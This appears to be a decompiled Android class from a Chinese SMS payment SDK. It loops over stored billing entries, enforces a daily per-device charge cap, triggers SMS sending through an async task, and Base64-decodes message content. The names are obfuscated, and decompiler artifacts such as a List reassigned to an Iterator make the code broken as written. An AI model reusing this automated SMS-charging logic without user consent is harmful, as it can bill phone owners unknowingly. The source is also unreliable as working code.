package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import android.util.Base64;
import com.zhangzhifu.sdk.ZhangPayCallback;
import com.zhangzhifu.sdk.db.MoreSMSWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.MoreSmsProcedure;
import com.zhangzhifu.sdk.modle.MoreSmsWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.MsgResponse_MS;
import java.util.Iterator;
import java.util.List;

public class ZhangPayMSF
{
  private static ZhangPayMSF aB;
  public static int allFlow;
  public static String currentWapUrl;
  private MoreSmsProcedure aC;
  private MsgResponse_MS aD;
  private Context ao;
  private String aq;
  public int count;
  public boolean isSend = false;
  public boolean isSendNext = false;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayMSF(Context paramContext)
  {
    this.ao = paramContext;
  }
  
  public static ZhangPayMSF getInstance(Context paramContext)
  {
    if (aB == null) {
      aB = new ZhangPayMSF(paramContext);
    }
    return aB;
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      MoreSmsWap localMoreSmsWap = (MoreSmsWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.ao)) {
        break;
      }
      if (localMoreSmsWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localMoreSmsWap.getAllProcedure() != null) && (localMoreSmsWap.getAllProcedure().size() != 0))
      {
        ZhangPayLog.d("ZhangPayMSF", "发短信的时间开始");
        new d(this, localMoreSmsWap).execute(new String[] { "" });
        MoreSMSWapDBManager.getInstance().delWapById(this.ao, localMoreSmsWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.ao, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
  
  public byte[] getSmsContent(String paramString)
  {
    if (paramString != null) {
      return Base64.decode(paramString, 0);
    }
    return null;
  }
}
